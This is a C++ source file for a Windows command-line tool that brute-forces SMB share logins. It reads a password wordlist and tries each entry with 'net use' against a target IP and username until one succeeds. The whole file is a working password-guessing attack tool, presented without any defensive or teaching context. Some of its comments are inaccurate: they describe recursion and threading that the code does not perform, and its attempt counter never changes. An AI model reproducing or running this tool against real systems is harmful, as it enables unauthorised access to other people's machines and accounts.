#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <Windows.h>

const size_t MAIN_BATCH_SIZE = 1000;  // Start with 1000 passwords per main batch
bool passwordFound = false;           // Flag to check if the password was found
int batchAttemptCount = 0;            // Counter for batch attempts
CRITICAL_SECTION cs;                  // Windows critical section for thread-safe batch count

// Function to execute a command and check its success
bool executeCommand(const std::string& command) {
    // Setup the process startup information (for wide-character support)
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };  // Use STARTUPINFOW for wide characters
    PROCESS_INFORMATION pi;
    
    // Convert the command to a wide string (needed for CreateProcessW)
    std::wstring wideCommand(command.begin(), command.end());

    // Create the process (run the command) - Using CreateProcessW for wide character support
    if (!CreateProcessW(NULL, &wideCommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Get the exit code of the process
    DWORD exitCode;
    if (GetExitCodeProcess(pi.hProcess, &exitCode) == 0) {
        std::cerr << "Failed to get exit code: " << GetLastError() << std::endl;
        return false;
    }

    // Close the process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Check if the exit code indicates success (0 means success for net use)
    return exitCode == 0;
}

// Function to process a small batch directly (non-recursive)
void processSmallBatch(const std::vector<std::string>& batch, const std::string& ip, const std::string& user) {
    for (size_t i = 0; i < batch.size(); ++i) {
        const std::string& password = batch[i];
        
        // Attempt to connect with the current password
        std::string command = "net use \\\\" + ip + " /user:" + user + " " + password;
        std::cout << "[Attempt " << batchAttemptCount << "] Trying password: " << password << std::endl;

        if (executeCommand(command)) {
            passwordFound = true;
            std::cout << "Password Found: " << password << std::endl;
            break;
        }
    }
}

// Function to split and process the batch recursively with threading
void processBatchRecursive(std::vector<std::string>& batch, const std::string& ip, const std::string& user) {
    // If the batch size is less than or equal to MAIN_BATCH_SIZE, process it directly
    if (batch.size() <= MAIN_BATCH_SIZE) {
        std::cout << "Batch size <= MAIN_BATCH_SIZE, processing directly." << std::endl;
        processSmallBatch(batch, ip, user);
        return;
    }

    // Split the batch into two parts
    size_t mid = batch.size() / 2;
    std::vector<std::string> firstHalf(batch.begin(), batch.begin() + mid);
    std::vector<std::string> secondHalf(batch.begin() + mid, batch.end());

    // Check if password is likely in the first half or the second half based on previous results
    std::cout << "Processing first half of the batch..." << std::endl;
    processSmallBatch(firstHalf, ip, user);

    if (passwordFound) {
        std::cout << "Password found in the first half." << std::endl;
        return;
    }

    // Continue with second half if password wasn't found in the first half
    std::cout << "Processing second half of the batch..." << std::endl;
    processSmallBatch(secondHalf, ip, user);
}

int main() {
    std::string ip, user, wordlist;

    // Initialize critical section
    InitializeCriticalSection(&cs);

    // Get user input
    std::cout << "Enter IP Address: ";
    std::getline(std::cin, ip);

    std::cout << "Enter Username: ";
    std::getline(std::cin, user);

    std::cout << "Enter Password List: ";
    std::getline(std::cin, wordlist);

    // Open the wordlist file
    std::ifstream file(wordlist);
    if (!file) {
        std::cerr << "Error: Could not open file " << wordlist << std::endl;
        return 1;
    }

    // Read the passwords into a vector
    std::vector<std::string> passwords;
    std::string line;
    while (std::getline(file, line)) {
        passwords.push_back(line);
    }
    file.close();

    // Process the password list in batches using recursion
    processBatchRecursive(passwords, ip, user);

    if (!passwordFound) {
        std::cout << "Password not found." << std::endl;
    }

    std::cout << "Operation Complete." << std::endl;

    // Clean up critical section
    DeleteCriticalSection(&cs);

    return 0;
}
